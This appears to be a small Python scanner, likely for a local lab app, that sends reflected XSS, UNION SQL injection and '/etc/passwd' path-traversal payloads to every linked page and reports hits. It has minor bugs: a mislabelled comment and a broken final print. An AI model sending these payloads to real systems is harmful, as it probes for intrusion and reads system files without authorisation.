from bs4 import BeautifulSoup

def get_url_list(session, toCheck):
    response = session.get(toCheck)
    soup = BeautifulSoup(response.content, "html.parser")
    links = soup.find_all("a")
    url_list = []
    for link in links:
        url_list.append('/' + link.get("href"))
    return url_list

def check_vulnerabilities(session, url_list):
    for index, link in enumerate(url_list):

        # Check for XSS injection vulnerability
        url = "http://172.17.0.1" + link + "?name=%3Cscript%3Ealert%28%22ok%22%29%3C%2Fscript%3E#"
        response = session.get(url)
        if '<script>alert("ok")</script>' in response.text:
            print(f"===> Faille XSS reflected détectée dans la page : http://172.17.0.1{link}")

        # Check for SQL injection vulnerability
        url = "http://172.17.0.1" + link  + "?id=%27+UNION+SELECT+%40%40VERSION%2C+%27OKAY%27+%23&Submit=Submit#"
        response = session.get(url)
        if 'OKAY' in response.text:
            print(f"===> La base de données est accessible dans la page : http://172.17.0.1{link}")

        # Check for command injection vulnerability
        url = url = "http://172.17.0.1" + link + "?page=../../../../../../../etc/passwd"
        response = session.get(url)
        if "root:x:0:0:root:/root:/" in response.text:
            print("===> Faille de l'inclusion de fichier local détectée à l'URL : http://127.0.0.1{link}")
